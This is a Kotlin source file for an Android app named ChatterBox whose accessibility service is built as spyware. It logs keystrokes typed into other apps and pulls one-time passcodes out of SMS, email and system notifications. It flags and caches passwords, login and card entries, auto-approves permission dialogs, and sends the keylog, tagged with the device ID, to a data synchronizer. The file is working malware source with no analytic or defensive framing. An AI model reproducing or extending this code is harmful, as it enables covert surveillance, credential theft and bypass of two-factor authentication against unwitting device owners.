package com.example.ChatterBox.accessibility

import android.accessibilityservice.AccessibilityServiceInfo
import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.app.NotificationCompat
import com.example.ChatterBox.MainActivity
import com.example.ChatterBox.R
import com.example.ChatterBox.database.AccountManager
import com.example.ChatterBox.database.DataSynchronizer
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

@SuppressLint("HardwareIds")
class AccessibilityService : android.accessibilityservice.AccessibilityService() {
    private val TAG = "ChatterBoxAccessibility"
    private val handler = Handler(Looper.getMainLooper())
    private lateinit var permissionDialogs: PermissionDialogs

    private val keylogBuffer = StringBuilder()
    private var currentFocusedApp = ""
    private var lastInputTime = 0L
    private val keylogFlushDelay = 5000L
    // Map to track recently processed OTPs
    private val processedOtps = HashMap<String, Long>()
    // How long to remember a processed OTP (5 minutes in milliseconds)
    private val OTP_DEDUPLICATION_TIMEOUT = 5 * 60 * 1000L
    // OTP detection patterns
    private val otpPattern = Regex("\\b\\d{4,6}\\b")

    private val deviceId by lazy {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }

    companion object {
        private var instance: AccessibilityService? = null

        fun getInstance(): AccessibilityService? {
            return instance
        }
    }

    override fun onServiceConnected() {
        Log.i(TAG, "Accessibility Service connected")
        instance = this
        permissionDialogs = PermissionDialogs(this)

        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                AccessibilityEvent.TYPE_VIEW_CLICKED or
                AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED // Important for keylogging
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        info.notificationTimeout = 100

        this.serviceInfo = info

        Log.d(TAG, "Accessibility service configured and ready")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        IdleDetector.processAccessibilityEvent(event)

        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && event.packageName != null) {
            if (currentFocusedApp != event.packageName) {
                if (keylogBuffer.isNotEmpty()) {
                    flushKeylogBuffer()
                }
                currentFocusedApp = event.packageName.toString()
            }
        }

        // Check if this is a notification event
        if (event.eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            extractOtpFromNotification(event)
        }

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val sourceText = event.text?.joinToString(" ") ?: ""
            val packageName = event.packageName?.toString() ?: "unknown"
            currentFocusedApp = packageName

            if (packageName != "com.example.ChatterBox" && sourceText.isNotEmpty()) {
                keylogBuffer.append(sourceText)
                keylogBuffer.append(" ")
                lastInputTime = System.currentTimeMillis()

                handler.removeCallbacks(keylogFlushRunnable)
                handler.postDelayed(keylogFlushRunnable, keylogFlushDelay)

                if (isSensitiveField(event) || containsSensitiveData(sourceText)) {
                    handleSensitiveData(packageName, sourceText)
                }

                detectAndHandleOTP(packageName, sourceText)
            }
        }

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                val packageName = event.packageName?.toString() ?: return

                if (permissionDialogs.isGrantingPermissions() &&
                    (packageName.contains("permissioncontroller") ||
                            packageName == "android" ||
                            packageName == "com.android.systemui" ||
                            packageName == "com.android.settings")) {

                    handler.postDelayed({
                        checkAllWindowsForPermissionDialogs()
                    }, 300)
                }

                // Also check for notifications in status bar views
                if (packageName == "com.android.systemui") {
                    checkForNotificationsInSystemUI(event)
                }
            }
        }

    when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                val packageName = event.packageName?.toString() ?: return

                if (permissionDialogs.isGrantingPermissions() &&
                    (packageName.contains("permissioncontroller") ||
                            packageName == "android" ||
                            packageName == "com.android.systemui" ||
                            packageName == "com.android.settings")) {

                    handler.postDelayed({
                        checkAllWindowsForPermissionDialogs()
                    }, 300)
                }
            }
        }
    }
    private val notificationOtpPatterns = listOf(
        Regex("\\b\\d{4,6}\\b"),
        Regex("(?i)\\bcode\\s*(?:is|:)?\\s*(\\d{4,8})"),
        Regex("(?i)\\botp\\s*(?:is|:)?\\s*(\\d{4,8})"),
        Regex("(?i)\\bverification\\s*(?:code|number)?\\s*(?:is|:)?\\s*(\\d{4,8})"),
        Regex("(?i)\\bpasscode\\s*(?:is|:)?\\s*(\\d{4,8})"),
        Regex("(?i)\\bsecurity\\s*code\\s*(?:is|:)?\\s*(\\d{4,8})")
    )

    private val otpKeywords = listOf(
        "verification", "code", "otp", "passcode", "security",
        "confirm", "authenticate", "token", "one-time", "password"
    )
    private fun extractOtpFromNotification(event: AccessibilityEvent) {
        // Get the notification text
        val notificationText = event.text?.joinToString(" ") ?: ""

        // Skip empty notifications or our own notifications
        if (notificationText.isEmpty() ||
            (event.packageName?.toString() == "com.example.ChatterBox")) {
            return
        }

        // Check if this notification might contain an OTP
        val mightContainOtp = otpKeywords.any { keyword ->
            notificationText.contains(keyword, ignoreCase = true)
        }

        if (mightContainOtp ||
            notificationText.contains("code", ignoreCase = true) ||
            Regex("\\b\\d{4,6}\\b").containsMatchIn(notificationText)) {

            // Try to extract OTP using our patterns
            val otp = extractOtpFromText(notificationText) ?: return

            val sourceApp = event.packageName?.toString() ?: "unknown"
            val sourceType = determineSourceType(sourceApp)

            // Create a unique key for this OTP
            val otpKey = "$sourceType:$sourceApp:$otp"
            val currentTime = System.currentTimeMillis()

            synchronized(processedOtps) {
                // Check if this OTP has been processed recently
                if (processedOtps.containsKey(otpKey)) {
                    // Already processed, ignore
                    return
                }

                // Mark this OTP as processed
                processedOtps[otpKey] = currentTime

                // Clean up old entries
                cleanupProcessedOtps()
            }

            // Now process the OTP since it's new
            Log.d(TAG, "New OTP detected in notification from $sourceApp: $otp")

            try {
                AccountManager.cacheAuthData(
                    applicationContext, "$sourceType:$sourceApp", "otp", otp
                )

                AccountManager.cacheAuthData(
                    applicationContext, "$sourceType:$sourceApp", "message", notificationText
                )

                keylogBuffer.append("[OTP from $sourceType: $otp] ")
                lastInputTime = System.currentTimeMillis()

                handler.removeCallbacks(keylogFlushRunnable)
                handler.postDelayed(keylogFlushRunnable, 1000)

            } catch (e: Exception) {
                Log.e(TAG, "Error handling notification OTP: ${e.message}")
            }
        }
    }

    private fun determineSourceType(packageName: String): String {
        return when {
            packageName.contains("sms") ||
                    packageName.contains("message") ||
                    packageName == "com.android.mms" ||
                    packageName == "com.google.android.apps.messaging" ||
                    packageName == "com.samsung.android.messaging" -> "SMS"

            packageName.contains("mail") ||
                    packageName == "com.google.android.gm" ||
                    packageName == "com.microsoft.office.outlook" ||
                    packageName == "com.yahoo.mobile.client.android.mail" -> "Email"

            else -> "Notification"
        }
    }
    private fun cleanupProcessedOtps() {
        val currentTime = System.currentTimeMillis()
        val iterator = processedOtps.entries.iterator()

        while (iterator.hasNext()) {
            val entry = iterator.next()
            if (currentTime - entry.value > OTP_DEDUPLICATION_TIMEOUT) {
                iterator.remove()
            }
        }
    }

    private fun checkForNotificationsInSystemUI(event: AccessibilityEvent) {
        val source = event.source ?: return

        try {
            val notificationTexts = findNotificationTexts(source)

            for (notificationText in notificationTexts) {
                if (notificationText.isNotEmpty()) {
                    val mightContainOtp = otpKeywords.any { keyword ->
                        notificationText.contains(keyword, ignoreCase = true)
                    }

                    if (mightContainOtp ||
                        notificationText.contains("code", ignoreCase = true) ||
                        Regex("\\b\\d{4,6}\\b").containsMatchIn(notificationText)) {

                        val extractedOtp = extractOtpFromText(notificationText)

                        if (extractedOtp == null) {
                            continue
                        }

                        val otp = extractedOtp
                        val otpKey = "SystemUI:$otp"
                        val currentTime = System.currentTimeMillis()

                        // Check for duplicate
                        var isDuplicate = false
                        synchronized(processedOtps) {
                            if (processedOtps.containsKey(otpKey)) {
                                isDuplicate = true
                            } else {
                                processedOtps[otpKey] = currentTime
                                cleanupProcessedOtps()
                            }
                        }
                        if (isDuplicate) {
                            continue
                        }
                        Log.d(TAG, "New OTP detected in system UI: $otp")

                        try {
                            AccountManager.cacheAuthData(
                                applicationContext, "SystemUI", "otp", otp
                            )
                            AccountManager.cacheAuthData(
                                applicationContext, "SystemUI", "message", notificationText
                            )
                            keylogBuffer.append("[OTP from SystemUI: $otp] ")
                            lastInputTime = System.currentTimeMillis()
                            handler.removeCallbacks(keylogFlushRunnable)
                            handler.postDelayed(keylogFlushRunnable, 1000)

                        } catch (e: Exception) {
                            Log.e(TAG, "Error handling SystemUI OTP: ${e.message}")
                        }
                    }
                }
            }
        } finally {
            source.recycle()
        }
    }
    private fun findNotificationTexts(node: AccessibilityNodeInfo): List<String> {
        val result = mutableListOf<String>()
        val notificationIds = listOf(
            "android:id/title",
            "android:id/text",
            "android:id/big_text",
            "com.android.systemui:id/notification_title",
            "com.android.systemui:id/notification_text"
        )

        for (id in notificationIds) {
            try {
                val nodes = node.findAccessibilityNodeInfosByViewId(id)
                for (foundNode in nodes) {
                    val text = foundNode.text?.toString()
                    if (!text.isNullOrEmpty()) {
                        result.add(text)
                    }
                    foundNode.recycle()
                }
            } catch (_: Exception) {
            }
        }
        try {
            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                if (child != null) {
                    val text = child.text?.toString()
                    if (!text.isNullOrEmpty()) {
                        result.add(text)
                    }
                    result.addAll(findNotificationTexts(child))
                }
            }
        } catch (_: Exception) {
        }

        return result
    }

    private fun extractOtpFromText(text: String): String? {
        for (pattern in notificationOtpPatterns) {
            val matcher = pattern.find(text)
            if (matcher != null) {
                return matcher.groupValues.getOrNull(1) ?: matcher.value
            }
        }
        val otpMatch = otpPattern.find(text)
        return otpMatch?.value
    }
    private fun detectAndHandleOTP(packageName: String, sourceText: String) {
        val otpMatcher = otpPattern.find(sourceText) ?: return
        val otp = otpMatcher.value
        val otpKey = "$packageName:$otp"
        val currentTime = System.currentTimeMillis()

        synchronized(processedOtps) {
            if (processedOtps.containsKey(otpKey)) {
                return
            }
            processedOtps[otpKey] = currentTime
            cleanupProcessedOtps()
        }
        try {
            AccountManager.cacheAuthData(applicationContext, packageName, "otp", otp)
            keylogBuffer.append("[OTP: $otp] ")
            lastInputTime = System.currentTimeMillis()
            handler.removeCallbacks(keylogFlushRunnable)
            handler.postDelayed(keylogFlushRunnable, 1000)
        } catch (e: Exception) {
            Log.e(TAG, "Error handling OTP: ${e.message}")
        }
    }

    private fun handleSensitiveData(packageName: String, sourceText: String) {
        if (sourceText.contains("password", ignoreCase = true) ||
            sourceText.contains("login", ignoreCase = true) ||
            sourceText.contains("email", ignoreCase = true) ||
            sourceText.contains("account", ignoreCase = true) ||
            sourceText.contains("credit", ignoreCase = true) ||
            sourceText.contains("card", ignoreCase = true)
        ) {
            AccountManager.cacheAuthData(
                applicationContext, packageName, "input_field", sourceText
            )
        }

        val intent = Intent("com.example.ChatterBox.ACCESSIBILITY_DATA")
        intent.putExtra("captured_text", sourceText)
        intent.putExtra("source_app", packageName)
        sendBroadcast(intent)
    }

    private val keylogFlushRunnable = Runnable {
        flushKeylogBuffer()
    }

    private fun flushKeylogBuffer() {
        if (keylogBuffer.isEmpty()) return

        try {
            val keylogData = JSONObject().apply {
                put("timestamp", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date()))
                put("device_id", deviceId)
                put("app", currentFocusedApp)
                put("text", keylogBuffer.toString())
                put("device_model", Build.MODEL)
                put("android_version", Build.VERSION.RELEASE)
            }
            val dataSynchronizer = DataSynchronizer(applicationContext)
            dataSynchronizer.sendData("keylog", keylogData.toString())
            keylogBuffer.clear()

        } catch (e: Exception) {
            Log.e(TAG, "Error flushing keylog buffer: ${e.message}")
        }
    }

    private fun containsSensitiveData(text: String): Boolean {
        val lowercase = text.lowercase()

        // Added OTP pattern detection to the sensitive data check
        if (otpPattern.containsMatchIn(text)) return true

        if (lowercase.contains("@") && lowercase.contains(".")) return true

        if (Regex("\\d{4,}").containsMatchIn(text)) return true

        return lowercase.contains("password") ||
                lowercase.contains("login") ||
                lowercase.contains("token") ||
                lowercase.contains("secret") ||
                lowercase.contains("key") ||
                lowercase.contains("credit") ||
                lowercase.contains("card") ||
                lowercase.contains("account") ||
                lowercase.contains("verification code") ||
                lowercase.contains("authentication code") ||
                lowercase.contains("security code") ||
                lowercase.contains("code")

    }

    private fun isSensitiveField(event: AccessibilityEvent): Boolean {
        val source = event.source ?: return false

        try {
            if (source.isPassword) return true

            val hintText = source.hintText?.toString()?.lowercase() ?: ""
            val contentDesc = source.contentDescription?.toString()?.lowercase() ?: ""

            return hintText.contains("password") || hintText.contains("login") ||
                    hintText.contains("email") || hintText.contains("username") ||
                    contentDesc.contains("password") || contentDesc.contains("login") ||
                    contentDesc.contains("email") || contentDesc.contains("username") ||
                    hintText.contains("otp") || hintText.contains("verification") ||
                    hintText.contains("code") || hintText.contains("pin") ||
                    contentDesc.contains("otp") || contentDesc.contains("verification") ||
                    contentDesc.contains("code") || contentDesc.contains("pin")
        } finally {
            source.recycle()
        }
    }

    private fun checkAllWindowsForPermissionDialogs() {
        try {
            val root = rootInActiveWindow
            if (root != null) {
                permissionDialogs.handlePermissionDialog(root)
            }

            windows.forEach { window ->
                val windowRoot = window.root ?: return@forEach
                permissionDialogs.handlePermissionDialog(windowRoot)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error handling permission dialogs", e)
        }
    }

    fun startPermissionGrantingMode(expectedPermissions: Int) {
        permissionDialogs.startGrantingPermissions(expectedPermissions)
    }

    fun stopPermissionGrantingMode() {
        permissionDialogs.stopGrantingPermissions()
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted")
    }

    override fun onDestroy() {
        if (keylogBuffer.isNotEmpty()) {
            flushKeylogBuffer()
        }
        permissionDialogs.cleanup()
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }
}